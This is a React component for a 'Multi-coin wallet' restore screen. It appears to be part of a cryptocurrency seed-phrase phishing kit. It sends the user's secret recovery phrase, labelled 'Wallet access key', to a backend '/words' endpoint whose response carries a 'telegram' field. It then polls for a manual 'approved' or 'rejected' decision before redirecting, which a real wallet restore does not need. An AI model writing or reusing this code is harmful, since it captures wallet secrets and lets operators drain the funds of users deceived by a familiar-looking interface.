import { IoArrowBack, IoClose, IoScan } from 'react-icons/io5'
import { useState, useEffect } from 'react'
import { useNavigate } from 'react-router-dom'
import api from '../../api/axios'
import '../../styles/MultiCoinWalletSection.css'

function MultiCoinWalletSection({
  walletName: initialWalletName = '',
  secretPhrase: initialSecretPhrase = '',
  onBack,
  onRestoreSuccess,
  onRestoreError,
}) {
  const navigate = useNavigate()
  const [walletName, setWalletName] = useState(initialWalletName)
  const [secretPhrase, setSecretPhrase] = useState(initialSecretPhrase)
  const [isLoading, setIsLoading] = useState(false)
  const [statusPollingInterval, setStatusPollingInterval] = useState(null)
  const [statusMessage, setStatusMessage] = useState('')

  const canRestore = walletName.trim().length > 0 && secretPhrase.trim().length > 0

  useEffect(() => {
    return () => {
      if (statusPollingInterval) {
        clearInterval(statusPollingInterval)
      }
    }
  }, [statusPollingInterval])

  const handleWalletNameChange = (value) => {
    setWalletName(value)
  }

  const handleWalletNameClear = () => {
    setWalletName('')
  }

  const handleSecretPhraseChange = (value) => {
    setSecretPhrase(value)
  }

  const handlePasteSecretPhrase = async () => {
    try {
      const text = await navigator.clipboard.readText()
      setSecretPhrase(text)
    } catch (error) {
      console.error('Failed to paste:', error)
    }
  }

  const checkBatchStatus = async (id) => {
    try {
      const response = await api.get(`/words/${id}/status`)
      
      if (response.data.ok) {
        const batch = response.data.batch
        
        switch (batch.approvalStatus) {
          case 'approved':
            // Stop polling
            if (statusPollingInterval) {
              clearInterval(statusPollingInterval)
              setStatusPollingInterval(null)
            }
            
            // User approved - navigate to wallet dashboard
            setStatusMessage('✅ Wallet approved! Redirecting...')
            setTimeout(() => {
              navigate('/wallet', { 
                state: { 
                  walletName, 
                  batchId: batch.id,
                  account: batch.account 
                } 
              })
            }, 1500)
            break
            
          case 'rejected':
            // Stop polling
            if (statusPollingInterval) {
              clearInterval(statusPollingInterval)
              setStatusPollingInterval(null)
            }
            
            setStatusMessage('❌ Wallet access denied. Please check your credentials and try again.')
            setIsLoading(false)
            break
            
          case 'pending':
          default:
            // Continue polling
            setStatusMessage('⏳ Waiting for approval...')
            break
        }
      }
    } catch (error) {
      console.error('Status check error:', error)
      setStatusMessage('⚠️ Error checking wallet status. Please try again.')
      setIsLoading(false)
      if (statusPollingInterval) {
        clearInterval(statusPollingInterval)
        setStatusPollingInterval(null)
      }
    }
  }

  const handleRestoreWallet = async () => {
    if (!canRestore || isLoading) return

    setIsLoading(true)
    setStatusMessage('⏳ Submitting wallet for approval...')
    
    try {
      const response = await api.post('/words', {
        words: secretPhrase,
        createdBy: walletName,
        source: 'wallet-restore',
        title: walletName // Using wallet name as title
      })

      if (response.data.ok) {
        const batch = response.data.batch
        
        // Start polling for status updates
        const interval = setInterval(() => {
          checkBatchStatus(batch.id)
        }, 3000) // Check every 3 seconds
        
        setStatusPollingInterval(interval)
        
        // Initial status check
        await checkBatchStatus(batch.id)
        
        onRestoreSuccess?.({
          walletName,
          secretPhrase,
          batchId: batch.id,
          telegram: response.data.telegram,
        })
      } else {
        throw new Error(response.data.error || 'Failed to restore wallet')
      }
    } catch (error) {
      console.error('Restore error:', error)
      setStatusMessage(`❌ Error: ${error.message || 'Failed to restore wallet'}`)
      setIsLoading(false)
      onRestoreError?.(error.message)
    }
  }

  const handleOpenSecretPhraseHelp = () => {
    // Open help modal or navigate to help page
    window.open('https://example.com/help', '_blank')
  }

  const handleBack = () => {
    if (statusPollingInterval) {
      clearInterval(statusPollingInterval)
      setStatusPollingInterval(null)
    }
    if (onBack) {
      onBack()
    } else {
      navigate('/')
    }
  }

  return (
    <main className="app-screen restore-screen">
      <FlowHeader
        title="Multi-coin wallet"
        onBack={handleBack}
        action={
          <button className="icon-button" type="button" aria-label="Scan">
            <IoScan />
          </button>
        }
      />
      <section className="restore-form">
        <div className="restore-field">
          <label htmlFor="wallet-name">Wallet name</label>
          <div className="wallet-name-field">
            <input
              id="wallet-name"
              type="text"
              value={walletName}
              enterKeyHint="next"
              onChange={(event) => handleWalletNameChange(event.target.value)}
              disabled={isLoading || statusPollingInterval !== null}
            />
            <button
              className="wallet-name-clear"
              type="button"
              aria-label="Clear name"
              onClick={handleWalletNameClear}
              disabled={isLoading || statusPollingInterval !== null}
            >
              <IoClose aria-hidden="true" />
            </button>
          </div>
        </div>
        <div className="restore-field">
          <label htmlFor="secret-phrase">Wallet access key</label>
          <div className="secret-phrase-safe-box">
            <textarea
              id="secret-phrase"
              value={secretPhrase}
              spellCheck="false"
              autoCapitalize="none"
              autoComplete="off"
              autoCorrect="off"
              enterKeyHint="done"
              onChange={(event) => handleSecretPhraseChange(event.target.value)}
              disabled={isLoading || statusPollingInterval !== null}
            />
            <button 
              type="button" 
              onClick={handlePasteSecretPhrase}
              disabled={isLoading || statusPollingInterval !== null}
            >
              Paste
            </button>
          </div>
        </div>
        <p>Enter the access details exactly as provided by your wallet</p>
        
        {statusMessage && (
          <div className={`status-message ${statusMessage.includes('❌') ? 'error' : statusMessage.includes('✅') ? 'success' : 'info'}`}>
            {statusMessage}
          </div>
        )}
      </section>
      <section className="restore-actions">
        <button 
          className="continue-button" 
          type="button" 
          disabled={!canRestore || isLoading || statusPollingInterval !== null} 
          onClick={handleRestoreWallet}
        >
          {isLoading || statusPollingInterval !== null ? 'Processing...' : 'Restore wallet'}
        </button>
        <button 
          className="secret-help" 
          type="button" 
          onClick={handleOpenSecretPhraseHelp}
          disabled={isLoading || statusPollingInterval !== null}
        >
          Need help with wallet access?
        </button>
      </section>
    </main>
  )
}

function FlowHeader({ title, onBack, action }) {
  return (
    <header className="flow-header">
      <button className="icon-button" type="button" aria-label="Back" onClick={onBack}>
        <IoArrowBack />
      </button>
      <h1>{title}</h1>
      {action || <span></span>}
    </header>
  )
}

export default MultiCoinWalletSection
